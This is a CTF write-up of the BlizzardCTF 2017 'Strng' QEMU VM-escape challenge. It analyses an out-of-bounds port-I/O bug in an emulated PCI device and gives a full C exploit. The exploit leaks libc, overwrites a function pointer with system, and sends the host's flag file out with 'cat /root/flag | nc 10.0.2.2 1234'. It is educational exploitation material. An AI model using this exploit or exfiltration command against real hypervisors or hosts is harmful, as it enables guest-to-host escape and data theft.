---
layout: post
title: BlizzardCTF 2017 - Strng
category: [Exploitation]
tags: [Exploitation, BlizzardCTF]
comments: true
---

**Points:** Legendary
**Solves:** 0
**Category:** Exploitation
**Description:** Blizzard CTF 2017: Sombra True Random Number Generator (STRNG)
Sombra True Random Number Generator (STRNG) is a QEMU-based challenge developed for Blizzard CTF 2017. The challenge was to achieve a VM escape from a QEMU-based VM and capture the flag located at /root/flag on the host.
The image used and distributed with the challenge was the Ubuntu Server 14.04 LTS Cloud Image. The host used the same image as the guest. The guest was reset every 10 minutes and was started with the following command:
./qemu-system-x86_64 -m 1G -device strng -hda my-disk.img -hdb my-seed.img -nographic -L pc-bios/ -enable-kvm -device e1000,netdev=net0 -netdev user,id=net0,hostfwd=tcp::5555-:22
Access to the guest was provided by redirecting incoming connections to the host on port 5555 to the guest on port 22.

Username/password: ubuntu/passw0rd

> [strng.tar.gz](https://github.com/rcvalle/blizzardctf2017/raw/master/strng.tar.gz)


## Summary

Since the end of Defcon Quals and the previous [EC3]({{site.url}}/exploitation/2018/05/13/DefconQuals-2018-EC3.html) blog post me and [aegis](https://twitter.com/lunixbochs) decided to tackle another QEMU VM escape challenge. The challenge is from last year's BlizzardCTF at Irvine California. Legendary challenges were incentivized with $1000 cash for the first solve however, no teams managed to solve this one during the competition, which was 8 hours with multiple Legendary, Epic, Rare and Common tasks.

The challenge revolves around exploiting an emulated hardware PCI device. The really cool part of this tasks is that you have to abuse not just the memory-mapped IO but also the port-mapped IO. Any read/write to the MMIO are handled by device's strng_mmio_read/write functions. Any read/write to the PMIO are handled by the device's strng_pmio_read/write functions. In short the device's registers contain a buffer and a couple of function pointers to srand, rand and rand_r. We have out-of-bound access bug from strng_pmio_write due to index buffer not being validated. The plan is to leak libc address and overwrite one of the function pointers with system@libc, then we can execute arbitrary commands on the host to retrieve the flag.

## STRNG PCI Device

To identify the device we start from the qemu command line arguments. There we can see `-device strng`, this tells us the name of the device. Dropping `qemu-system-x86_64` in IDA we can actually find all of the associated functions thanks to the symbols not being stripped. Starting with `strng_class_init` we can see the PCIDeviceClass structure being initialized with the device's device_id `0x11e9` and some other properties which all are going to be useful for identifying the STRNG device.

{% highlight text %}
ubuntu@ubuntu:~$ sudo su
root@ubuntu:/home/ubuntu# lspci
00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)
00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]
00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]
00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)
00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)
00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)
00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)
root@ubuntu:/home/ubuntu#
{% endhighlight %}

`lspci -v` can show us some information about the MMIO and PMIO addresses.

{% highlight text %}
root@ubuntu:/home/ubuntu# lspci -v

00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)
        Subsystem: Red Hat, Inc Device 1100
        Physical Slot: 3
        Flags: fast devsel
        Memory at febf1000 (32-bit, non-prefetchable) [size=256]
        I/O ports at c050 [size=8]
{% endhighlight %}

We can see that the MMIO is at address `0xfebf1000` with size of 256 bytes and PMIO ports start at `0xc050` in total of 8 ports.

We can verify all this by interacting with the sysfs. Notice the `resource0` and `resource1` we can relate these to MMIO and PMIO. 

{% highlight text %}
root@ubuntu:/home/ubuntu# ls -la /sys/devices/pci0000\:00/0000\:00\:03.0/
total 0
drwxr-xr-x  3 root root    0 May 18 18:55 .
drwxr-xr-x 11 root root    0 May 18 18:55 ..
-rw-r--r--  1 root root 4096 May 18 19:13 broken_parity_status
-r--r--r--  1 root root 4096 May 18 19:08 class
-rw-r--r--  1 root root  256 May 18 19:08 config
-r--r--r--  1 root root 4096 May 18 19:13 consistent_dma_mask_bits
-rw-r--r--  1 root root 4096 May 18 19:13 d3cold_allowed
-r--r--r--  1 root root 4096 May 18 19:08 device
-r--r--r--  1 root root 4096 May 18 19:13 dma_mask_bits
-rw-r--r--  1 root root 4096 May 18 19:13 enable
lrwxrwxrwx  1 root root    0 May 18 19:13 firmware_node -> ../../LNXSYSTM:00/device:00/PNP0A03:00/device:06
-r--r--r--  1 root root 4096 May 18 18:58 irq
-r--r--r--  1 root root 4096 May 18 19:13 local_cpulist
-r--r--r--  1 root root 4096 May 18 19:13 local_cpus
-r--r--r--  1 root root 4096 May 18 19:13 modalias
-rw-r--r--  1 root root 4096 May 18 19:13 msi_bus
drwxr-xr-x  2 root root    0 May 18 19:13 power
--w--w----  1 root root 4096 May 18 19:13 remove
--w--w----  1 root root 4096 May 18 19:13 rescan
-r--r--r--  1 root root 4096 May 18 19:08 resource
-rw-------  1 root root  256 May 18 19:13 resource0
-rw-------  1 root root    8 May 18 19:13 resource1
lrwxrwxrwx  1 root root    0 May 18 19:13 subsystem -> ../../../bus/pci
-r--r--r--  1 root root 4096 May 18 19:13 subsystem_device
-r--r--r--  1 root root 4096 May 18 19:13 subsystem_vendor
-rw-r--r--  1 root root 4096 May 18 18:55 uevent
-r--r--r--  1 root root 4096 May 18 19:08 vendor
root@ubuntu:/home/ubuntu#
{% endhighlight %}

To verify the port numbers. We know that the STRNG PCI Device is `0000:00:03.0` from the `lspci [-v]` command. Make sure you absolutely don't access any other port because you might mess up your system :).

{% highlight text %}
root@ubuntu:/home/ubuntu# cat /proc/ioports
0000-0cf7 : PCI Bus 0000:00
  0000-001f : dma1
  0020-0021 : pic1
  0040-0043 : timer0
  0050-0053 : timer1
  0060-0060 : keyboard
  0064-0064 : keyboard
  0070-0071 : rtc0
  0080-008f : dma page reg
  00a0-00a1 : pic2
  00c0-00df : dma2
  00f0-00ff : fpu
  0170-0177 : 0000:00:01.1
    0170-0177 : ata_piix
  01f0-01f7 : 0000:00:01.1
    01f0-01f7 : ata_piix
  0376-0376 : 0000:00:01.1
    0376-0376 : ata_piix
  0378-037a : parport0
  03c0-03df : vga+
  03f2-03f2 : floppy
  03f4-03f5 : floppy
  03f6-03f6 : 0000:00:01.1
    03f6-03f6 : ata_piix
  03f7-03f7 : floppy
  03f8-03ff : serial
  0600-063f : 0000:00:01.3
    0600-0603 : ACPI PM1a_EVT_BLK
    0604-0605 : ACPI PM1a_CNT_BLK
    0608-060b : ACPI PM_TMR
  0700-070f : 0000:00:01.3
0cf8-0cff : PCI conf1
0d00-ffff : PCI Bus 0000:00
  afe0-afe3 : ACPI GPE0_BLK
  c000-c03f : 0000:00:04.0
    c000-c03f : e1000
  c040-c04f : 0000:00:01.1
    c040-c04f : ata_piix
  c050-c057 : 0000:00:03.0    # <<
root@ubuntu:/home/ubuntu#
{% endhighlight %}

The device ID

{% highlight text %}
root@ubuntu:/home/ubuntu# cat /sys/devices/pci0000\:00/0000\:00\:03.0/device
0x11e9
{% endhighlight %}

And we can also verify the mappings from the `resource` file. The columns here are
`start-address end-address flags` First row mapping is the MMIO second for PMIO.

{% highlight text %}
root@ubuntu:/home/ubuntu# cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource
0x00000000febf1000 0x00000000febf10ff 0x0000000000040200
0x000000000000c050 0x000000000000c057 0x0000000000040101
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
root@ubuntu:/home/ubuntu#
{% endhighlight %}

Moving on to `pci_strng_realize` function we can see the registered operations for read/write mapping accesses. We will go over each one of these individually.

## Debugging

The way I have this setup is with a gdb start-up script. QEMU is compiled with full PIE so I will be disabling it to be able to insert breakpoints at constant addresses. I'm not using the `-enable-kvm` option because I'm on a Mac/Windows otherwise this will make your VM exponentially faster.

{% highlight text %}
➜  strng cat cmdline.txt
aslr off
b *0x555555964390   # strng_mmio_read
b *0x5555559643E0   # strng_mmio_write
b *0x5555559644B0   # strng_pmio_read
b *0x555555964520   # strng_pmio_write

run  -m 1G -device strng -hda my-disk.img -hdb my-seed.img -nographic -L pc-bios/ -device e1000,netdev=net0 -netdev user,id=net0,hostfwd=tcp::5555-:22
➜  strng gdb -q qemu-system-x86_64
Reading symbols from qemu-system-x86_64...done.
gdb-peda$ source cmdline.txt
Breakpoint 1 at 0x555555964390
Breakpoint 2 at 0x5555559643e0
Breakpoint 3 at 0x5555559644b0
Breakpoint 4 at 0x555555964520
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff627b700 (LWP 2351)]
[New Thread 0x7fffe0dac700 (LWP 2352)]
[New Thread 0x7fffdec0b700 (LWP 2353)]
main-loop: WARNING: I/O thread spun for 1000 iterations
...
{% endhighlight %}

## MMIO

### strng_mmio_read

Plain and simple, takes an address and size and returns `size_t` from the MMIO. The required read size is 4 bytes at a time and address is just the offset within the MMIO buffer.

{% highlight C %}
uint64_t __fastcall strng_mmio_read(void *opaque, hwaddr addr, unsigned int size)
{
  result = -1LL;
  if ( size == 4 && !(addr & 3) )
    result = *((unsigned int *)opaque + (addr >> 2) + 0x2BD);
  return result;
}
{% endhighlight %}

### strng_mmio_write

To keep it more presentable I've cut some bits and pieces from the decompilation output. But as you can see the mmio_write takes in the address which is an offset in the MMIO, value to be written and size of the write which should be 4 bytes just as the read. We have the function pointers invocations here if we try to write to offset 0
we call `srand(val)`, if we write to offset 4 we invoke `rand()` and `rand_r()` at offset 12.

{% highlight C %}
void __fastcall strng_mmio_write(void *opaque, hwaddr addr, uint32_t val, unsigned int size)
{
  if ( size != 4 || addr & 3 )
    return;
  idx = addr >> 2;
  if ( idx == 1 ) {
    *((_DWORD *)opaque + 0x2BE) = opaque->rand();
    return;
  }
  if ( idx >= 1 )
  {
    if ( idx == 3 )
    {
      v6 = val;
      v7 = opaque->rand_r((_DWORD *)opaque + 0x2BF));
      LODWORD(val) = v6;
      *((_DWORD *)opaque + 0x2C0) = v7;
    }
    *((_DWORD *)opaque + (unsigned int)idx + 0x2BD) = val;
    return;
  }
  opaque->srand(val);
  return;
}
{% endhighlight %}

If you are thinking, "oh we have out-of-bound access here because addr is not checked anywhere", you would be wrong. The PCI device internally checks if the addr you are trying to access is within the boundaries of the MMIO thus only 256 bytes.

To access the MMIO we are going to use a modified version of [pcimem](https://github.com/billfarrow/pcimem).

## PMIO

From the recon phase we know the I/O ports are 8, 8 bytes mapped at `0xc050`. We can access them individually or multiple at a time. The `pmio_read/write` functions however, expect only 4 byte reads/writes. This means we only have 2 options, to read/write to address `0xc050` or `0xc054` which will make our addr argument either 0 or 4 so we can hit the appropriate branch.

### strng_pmio_read

{% highlight C %}
uint64_t __fastcall strng_pmio_read(void *opaque, hwaddr addr, unsigned int size)
{
  result = -1LL;
  if ( size == 4 )
  {
    if ( addr )
    {
      if ( addr == 4 )
      {
        offset = *((_DWORD *)opaque + 0x2BC);
        if ( !(offset & 3) )
          result = *((unsigned int *)opaque + (offset >> 2) + 0x2BD);
      }
    }
    else
    {
      result = *((unsigned int *)opaque + 0x2BC);
    }
  }
  return result;
}
{% endhighlight %}

### strng_pmio_write

{% highlight C %}
void __fastcall strng_pmio_write(void *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
  if ( size != 4 )
    return;
  if ( !addr )
  {
    *((_DWORD *)opaque + 0x2BC) = val;
    return;
  }
  if ( addr != 4 )
    return;
  offset = *((_DWORD *)opaque + 0x2BC);
  if ( offset & 3 )
    return;
  idx = offset >> 2;
  if ( idx == 1 )
  {
    *((_DWORD *)opaque + 0x2BE) = opaque->rand();
    return;
  }
  if ( idx >= 1 )
  {
    if ( idx == 3 )
      v7 = opaque->rand_r((_DWORD *)opaque + 0x2BF));
    else
      *((_DWORD *)opaque + idx + 0x2BD) = val;
    goto RET;
  }
  opaque->srand(val);
  return;
}
{% endhighlight %}

Aha! the offset to read/write to is stored in port `0xc050` here is our out-of-bound bug. This gives us arbitrary read/write (actually only 32bit offset from the PCI Device which in the QEMU process space is located on the host's heap).

So, writing to `0xc050` let's us store the offset address and writing to `0xc054` let's us use the stored offset as write address in the PCI device.

Here are a few cool methods of accessing port I/O.

### sysfs resourceX

We can read/write to the sysfs using dd, our own code or anything else that lets us read/write 4 bytes at a time from a file.

* `dd if=/sys/devices/pci0000\:00/0000\:00\:03.0/resource1 bs=4 count=1` - read the index 0
* `dd if=/sys/devices/pci0000\:00/0000\:00\:03.0/resource1 bs=4 count=1 skip=1` - use index 0 as offset address to read from
* `dd if=XXX of=/sys/devices/pci0000\:00/0000\:00\:03.0/resource1 bs=4 count=1` - write to index 0
* `dd if=XXX of=/sys/devices/pci0000\:00/0000\:00\:03.0/resource1 bs=4 count=1 skip=1` - use index 0 as offset to write to

### /dev/port

`/dev/port` is a character device which lets you access any of your system's port I/Os. The trick here is that you have to use the actual port numbers, in our case `0xc050-0xc057`. You can test this with `dd` the same way we did in the `resourceX` section. However, if you do that you will quickly notice that because this is a character device all port accesses are being done byte-by-byte. Using this method we can not fulfill the `size == 4` requirement.

{% highlight text %}
root@ubuntu:/home/ubuntu# ls -lha /dev/port
crw-r----- 1 root kmem 1, 4 May 18 18:57 /dev/port
{% endhighlight %}

`dd if=/dev/port bs=1 count=1 skip=49232` and `dd if=/dev/port bs=4 count=1 skip=12308` will both read 1 byte from the PMIO, just the later dd command will access the PMIO 4 times.

### <sys/io.h>

And the coolest method is using the port I/O x86 instructions like `inl` and `outl`. If you open the `io.h` header file, you will see all the macros available to you. For example for reading and writing 4 byte unsigned int.

{% highlight C %}
static __inline unsigned int
inl (unsigned short int __port)
{
  unsigned int _v;

  __asm__ __volatile__ ("inl %w1,%0":"=a" (_v):"Nd" (__port));
  return _v;
}

static __inline void
outl (unsigned int __value, unsigned short int __port)
{
  __asm__ __volatile__ ("outl %0,%w1": :"a" (__value), "Nd" (__port));
}
{% endhighlight %}

The trick here is that you have to give permission for your program to access the ports. For ports between `0x000-0x3ff` you can use `ioperm(from, num, turn_on)`. For higher ports you need to use `iopl(3)`, this will give your program access to all ports (man ioperm and man iopl). Your program needs to execute as root.

## Exploit

Now that we have everything laid out, I believe anybody can complete the exploit. But just for completeness here is a quick memory layout and the final script.

{% highlight text %}
gdb-peda$ x/40gx $rdi+0xaf0
0x555557e2c950: 0x0000000000000000      0x0000000000000000    # Emulated ports 0xc050-0xc057, MMIO
0x555557e2c960: 0x0000000000000000      0x0000000000000000    # Emulated MMIO 256 bytes
0x555557e2c970: 0x0000000000000000      0x0000000000000000    # from 0x555557e2c958
0x555557e2c980: 0x0000000000000000      0x0000000000000000    # to   0x555557e2ca58
0x555557e2c990: 0x0000000000000000      0x0000000000000000
0x555557e2c9a0: 0x0000000000000000      0x0000000000000000
0x555557e2c9b0: 0x0000000000000000      0x0000000000000000
0x555557e2c9c0: 0x0000000000000000      0x0000000000000000
0x555557e2c9d0: 0x0000000000000000      0x0000000000000000
0x555557e2c9e0: 0x0000000000000000      0x0000000000000000
0x555557e2c9f0: 0x0000000000000000      0x0000000000000000
0x555557e2ca00: 0x0000000000000000      0x0000000000000000
0x555557e2ca10: 0x0000000000000000      0x0000000000000000
0x555557e2ca20: 0x0000000000000000      0x0000000000000000
0x555557e2ca30: 0x0000000000000000      0x0000000000000000
0x555557e2ca40: 0x0000000000000000      0x0000000000000000
0x555557e2ca50: 0x0000000000000000      0x00007ffff65268d0    # srand()
0x555557e2ca60: 0x00007ffff6526f60      0x00007ffff6526f70    # rand(), rand_r()
{% endhighlight %}

The plan is to first leak libc by using `strng_pmio_read` and `strng_pmio_write`. `strng_pmio_write` can write the index to be read by the `strng_pmio_read` this way we can leak one of the 3 pointers stored in the emulated PCI Device address space. Then we are going to use the `strng_mmio_write` to store the command line we want to execute. And then we are going to overwrite the `rand_r` pointer with the address of `system@libc` because its called with the argument we control. And finally we are going to call the corrupted `rand_r` pointer. The command I chose is `cat /root/flag | nc 10.0.2.2 1234`.

In my setup I use MacOS to host a vagrant box that runs the QEMU process which emulates the vulnerable PCI Device. We can grab the flag from the vagrant box by using a listen nc on the Mac.

{% highlight C %}
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <ctype.h>
#include <termios.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/io.h>

#define MAP_SIZE 4096UL
#define MAP_MASK (MAP_SIZE - 1)

unsigned int pmio_base = 0xc050;  // adjust this if different on qemu reset
char* pci_device_name = "/sys/devices/pci0000:00/0000:00:03.0/resource0";

/*
  oot@ubuntu:/home/ubuntu# cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource
  0x00000000febf1000 0x00000000febf10ff 0x0000000000040200  // mmio
  0x000000000000c050 0x000000000000c057 0x0000000000040101  // pmio
  0x0000000000000000 0x0000000000000000 0x0000000000000000
*/

void pmio_write(unsigned int val, unsigned int addr) {
  outl(val, addr);
}

void pmio_arb_write(unsigned int val, unsigned int offset) {
  int tmp = offset >> 2;
  if ( tmp == 1 || tmp == 3) {
    puts("PMIO write address is a command");
    return;
  }
  pmio_write(offset, pmio_base);
  pmio_write(val, pmio_base + 4);
}

unsigned int pmio_read(unsigned int offset) {
  if (offset == 0) {
    return inl(pmio_base);
  }
  pmio_write(offset, pmio_base);
  return inl(pmio_base + 4);
}

void mmio_write(unsigned int val, unsigned int offset) {
  int fd;
  void *map_base, *virt_addr;
  if((fd = open(pci_device_name, O_RDWR | O_SYNC)) == -1) {
    perror("open pci device");
    exit(-1);
  }
  map_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, MAP_SIZE & ~MAP_MASK);
  if(map_base == (void *) -1) {
    perror("mmap");
    exit(-1);
  }
  virt_addr = map_base + (offset & MAP_MASK);
  *((unsigned int*) virt_addr) = val;
  if(munmap(map_base, MAP_SIZE) == -1) {
    perror("munmap");
    exit(-1);
  }
    close(fd);
}

int main(int argc, char* argv[])
{
  if (0 != iopl(3)) {
    perror("iopl permissions");
    return -1;
  }

  unsigned long long  _srandom;
  unsigned long long  libc_base;
  unsigned long long  _system;

  /*
    >>> map(hex, unpack_many("cat /root/flag | nc 10.0.2.2 1234   "))
    ['0x20746163', '0x6f6f722f', '0x6c662f74', '0x7c206761', 
    '0x20636e20', '0x302e3031', '0x322e322e', '0x33323120', '0x20202034']
  */  

  mmio_write(0x6f6f722f, 0xc);
  mmio_write(0x20746163, 0x8);
  mmio_write(0x6c662f74, 0x10);
  mmio_write(0x7c206761, 0x14);
  mmio_write(0x20636e20, 0x18);
  mmio_write(0x302e3031, 0x1c);
  mmio_write(0x322e322e, 0x20);
  mmio_write(0x33323120, 0x24);
  mmio_write(0x20202034, 0x28);

  _srandom = pmio_read(0x108);
  _srandom <<= 32;
  _srandom |= pmio_read(0x104);

  libc_base = _srandom - 0x3a8d0;
  _system = libc_base + 0x45390;
  printf("libc_base: %llx\n", libc_base);
  printf("_system  : %llx\n", _system);

  pmio_arb_write(_system & 0xffffffff, 0x114);

  // call system ptr
  mmio_write(0, 0xc);

  return 0;
}
{% endhighlight %}


> Special thanks to [aegis](https://twitter.com/lunixbochs) and the task author [rcvalle](https://twitter.com/rcvalle?lang=en) for helping me understand QEMU and IO emulation. Thanks for the challenge. :)

### Links and references
* [Source of the task](https://github.com/rcvalle/blizzardctf2017) - The author only published this after the exploit was completed
* [libpciaccess](https://github.com/rcvalle/libpciaccess) - Good reference for interacting with MMIO/PMIO
* [tldp IO-Port-Programming pdf](https://www.tldp.org/HOWTO/pdf/IO-Port-Programming.pdf)
